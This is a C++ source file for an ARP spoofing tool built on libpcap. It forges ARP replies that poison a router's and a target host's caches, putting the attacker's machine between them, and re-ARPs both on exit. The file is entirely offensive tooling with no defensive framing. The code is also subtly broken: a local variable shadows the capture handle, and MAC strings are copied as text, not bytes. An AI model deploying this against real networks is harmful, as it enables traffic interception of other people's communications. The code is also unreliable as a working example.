#include <iostream>
#include <cstring>
#include <csignal>
#include <atomic>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "ArpSpoofer.h"

std::atomic<bool> quit(false);

ArpSpoofer::ArpSpoofer() {}

ArpSpoofer::ArpSpoofer(
    std::string sMac,
    std::string rMac,
    std::string tMac,
    std::string rIp,
    std::string tIp,
    int packetSize = 6000
) {
    spoofMac = sMac;
    routerMac = rMac;
    targetMac = tMac;
    routerIp = rIp;
    targetIp = tIp;
    maxPacketSize = packetSize;
    pcapHandle = NULL;

    registerSignalHandler();
}

ArpSpoofer::~ArpSpoofer() {
    std::cout << "destructor method" << std::endl;
    if (pcapHandle != NULL) {
        cleanUp(0);
        pcap_close(pcapHandle);
    }
}

void ArpSpoofer::registerSignalHandler() {
    struct sigaction signalAction;
    memset(&signalAction, 0, sizeof(signalAction));
    signalAction.sa_handler = signalHandler;
    sigfillset(&signalAction.sa_mask);
    sigaction(SIGINT, &signalAction, NULL);
}

void ArpSpoofer::signalHandler(int signum) {
    // Exit normally, so the class destructor is called.
    quit.store(true);
}

int ArpSpoofer::initialize() {
    pcap_if_t *interfaces;
    char errorBuffer[PCAP_ERRBUF_SIZE];

    // Find all network devices.
	if (pcap_findalldevs(&interfaces, errorBuffer) != 0) {
		std::cout << "Error in pcap_findalldevs: " << errorBuffer << std::endl;
		return 1;
	}

	if (interfaces == NULL) {
		std::cout << "No network devices found." << std::endl;
		return 1;
	}

	// Select the first interface from the list.
	interface = interfaces->name;

    int timeout_ms = 30;
    pcap_t *pcapHandle = pcap_open_live(
        interface.c_str(),
        maxPacketSize,
        1,
        timeout_ms,
        errorBuffer
    );

    if (pcapHandle == NULL) {
        std::cout << "Error in pcap_open_live: " << errorBuffer << std::endl;
        return 1;
    }

    return 0;
}

void ArpSpoofer::cleanUp(int signum) {
    char errorBuffer[PCAP_ERRBUF_SIZE];

    // re-ARP the router.
    u_char *routerPacket = (u_char *)malloc(ARP_PACKET_SIZE);
    struct EtherHeader *routerEtherHeader =
        (struct EtherHeader *)malloc(sizeof(struct EtherHeader));
    struct Arp *routerArpMessage = (struct Arp *)malloc(sizeof(struct Arp));
    createArpReply(
        routerEtherHeader,
        routerArpMessage,
        routerPacket,
        targetMac,
        targetIp,
        routerMac,
        routerIp
    );

    // re-ARP the target.
    u_char *targetPacket = (u_char *)malloc(ARP_PACKET_SIZE);
    struct EtherHeader *targetEtherHeader = (struct EtherHeader *)
        malloc(sizeof(struct EtherHeader));
    struct Arp *targetArpMessage = (struct Arp *)malloc(sizeof(struct Arp));
    createArpReply(
        targetEtherHeader,
        targetArpMessage,
        targetPacket,
        routerMac,
        routerIp,
        targetMac,
        targetIp
    );

    int numPackets = 15;
    std::cout << "Re-ARPing. Send " << numPackets <<
        " packets to the router and the target." << std::endl;
    for (int i = 0; i < numPackets; i++) {
        int bytesSentToRouter =
            pcap_inject(pcapHandle, routerPacket, ARP_PACKET_SIZE);
        int bytesSentToTarget =
            pcap_inject(pcapHandle, targetPacket, ARP_PACKET_SIZE);

        std::cout << bytesSentToRouter << " bytes sent to " << routerMac <<
            " -- " << targetIp << " is at " << targetMac << std::endl;
        std::cout << bytesSentToTarget << " bytes sent to " << targetMac <<
            " -- " << routerIp << " is at " << routerMac << std::endl;

        // Wait 1 second between sending packets.
        sleep(1);
    }

    pcap_close(pcapHandle);
    exit(signum);
}

int ArpSpoofer::spoof() {
    // ARP spoof the router.
    u_char *routerPacket = (u_char *)malloc(ARP_PACKET_SIZE);
    struct EtherHeader *routerEtherHeader =
        (struct EtherHeader *)malloc(sizeof(struct EtherHeader));
    struct Arp *routerArpMessage = (struct Arp *)malloc(sizeof(struct Arp));
    createArpReply(
        routerEtherHeader,
        routerArpMessage,
        routerPacket,
        spoofMac,
        targetIp,
        routerMac,
        routerIp);

    // ARP spoof the target.
    u_char *targetPacket =
        (u_char *)malloc(sizeof(struct EtherHeader) + sizeof(struct Arp));
    struct EtherHeader *targetEtherHeader =
        (struct EtherHeader *)malloc(sizeof(struct EtherHeader));
    struct Arp *targetArpMessage = (struct Arp *)malloc(sizeof(struct Arp));
    createArpReply(
        targetEtherHeader,
        targetArpMessage,
        targetPacket,
        spoofMac,
        routerIp,
        targetMac,
        targetIp);

    // ARP spoof until interrupted.
    std::cout << "ARPing..." << std::endl;
    while (true) {
        int bytesSentToRouter =
            pcap_inject(pcapHandle, routerPacket, ARP_PACKET_SIZE);
        int bytesSentToTarget =
            pcap_inject(pcapHandle, targetPacket, ARP_PACKET_SIZE);

        std::cout << bytesSentToRouter << " bytes sent to " << routerMac <<
            " -- " << targetIp << " is at " << spoofMac << std::endl;
        std::cout << bytesSentToTarget << " bytes sent to " << targetMac <<
            " -- " << routerIp << " is at " << spoofMac << std::endl;

        // Wait 5 seconds between sending packets.
        sleep(5);

        if (quit.load()) {
            break;
        }
    }

    return 0;
}

void ArpSpoofer::createArpReply(
    struct EtherHeader *etherHeader,
    struct Arp *arpMessage,
    u_char *packet,
    std::string srcMac,
    std::string srcIp,
    std::string targetMac,
    std::string targetIp
) {
    struct in_addr *src = (struct in_addr *)malloc(4);
    struct in_addr *target = (struct in_addr *)malloc(4);
    inet_aton(srcIp.c_str(), src);
    inet_aton(targetIp.c_str(), target);

    // Create new ethernet header.
    std::memcpy(etherHeader->dest, targetMac.c_str(), ETHER_ADDR_LEN);
    memcpy(etherHeader->src, srcMac.c_str(), ETHER_ADDR_LEN); 
    etherHeader->type = htons(0x0806);
    memcpy(packet, etherHeader, ETHER_HDR_LEN);

    // Create new ARP message.
    arpMessage->h_type = htons(0x0001);
    arpMessage->p_type = htons(0x0800);
    arpMessage->h_addr_len = 0x06;
    arpMessage->p_addr_len = 0x04;
    arpMessage->opcode = htons(0x0002);
    memcpy(arpMessage->h_src, srcMac.c_str(), ETHER_ADDR_LEN);
    arpMessage->p_src = *src;
    memcpy(arpMessage->h_tar, targetMac.c_str(), ETHER_ADDR_LEN);
    arpMessage->p_tar = *target;
    memcpy(packet + ETHER_HDR_LEN, arpMessage, sizeof(struct Arp));
}
